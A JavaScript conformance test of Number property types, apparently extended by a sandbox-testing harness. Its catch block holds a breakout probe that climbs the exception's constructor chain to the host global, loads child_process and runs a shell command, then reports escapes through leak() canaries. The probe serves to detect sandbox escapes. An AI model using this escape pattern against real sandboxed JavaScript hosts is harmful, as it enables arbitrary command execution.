try {
    if (typeof Number.MAX_VALUE !== 'number')
        $ERROR('#1: typeof Number.MAX_VALUE === "number". Actual: ' + typeof Number.MAX_VALUE);
    if (typeof Number['MAX_VALUE'] !== 'number')
        $ERROR('#2: typeof Number["MAX_VALUE"] === "number". Actual: ' + typeof Number['MAX_VALUE']);
    if (typeof Number.MIN_VALUE !== 'number')
        $ERROR('#3: typeof Number.MIN_VALUE === "number". Actual: ' + typeof Number.MIN_VALUE);
    if (typeof Number['MIN_VALUE'] !== 'number')
        $ERROR('#4: typeof Number["MIN_VALUE"] === "number". Actual: ' + typeof Number['MIN_VALUE']);
    if (typeof Number.NaN !== 'number')
        $ERROR('#5: typeof Number.NaN === "number". Actual: ' + typeof Number.NaN);
    if (typeof Number['NaN'] !== 'number')
        $ERROR('#6: typeof Number["NaN"] === "number". Actual: ' + typeof Number['NaN']);
    if (typeof Number.NEGATIVE_INFINITY !== 'number')
        $ERROR('#7: typeof Number.NEGATIVE_INFINITY === "number". Actual: ' + typeof Number.NEGATIVE_INFINITY);
    if (typeof Number['NEGATIVE_INFINITY'] !== 'number')
        $ERROR('#8: typeof Number["NEGATIVE_INFINITY"] === "number". Actual: ' + typeof Number['NEGATIVE_INFINITY']);
    if (typeof Number.POSITIVE_INFINITY !== 'number')
        $ERROR('#9: typeof Number.POSITIVE_INFINITY === "number". Actual: ' + typeof Number.POSITIVE_INFINITY);
    if (typeof Number['POSITIVE_INFINITY'] !== 'number')
        $ERROR('#10: typeof Number["POSITIVE_INFINITY"] === "number". Actual: ' + typeof Number['POSITIVE_INFINITY']);
    if (typeof Number.prototype.toString !== 'function')
        $ERROR('#11: typeof Number.prototype.toString === "function". Actual: ' + typeof Number.prototype.toString);
    if (typeof Number.prototype['toString'] !== 'function')
        $ERROR('#12: typeof Number.prototype["toString"] === "function". Actual: ' + typeof Number.prototype['toString']);
    if (typeof Number.prototype.constructor !== 'function')
        $ERROR('#13: typeof Number.prototype.constructor === "function". Actual: ' + typeof Number.prototype.constructor);
    if (typeof Number.prototype['constructor'] !== 'function')
        $ERROR('#14: typeof Number.prototype["constructor"] === "function". Actual: ' + typeof Number.prototype['constructor']);
    if (typeof Number.prototype.valueOf !== 'function')
        $ERROR('#15: typeof Number.prototype.valueOf === "function". Actual: ' + typeof Number.prototype.valueOf);
    if (typeof Number.prototype['valueOf'] !== 'function')
        $ERROR('#16: typeof Number.prototype["valueOf"] === "function". Actual: ' + typeof Number.prototype['valueOf']);
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}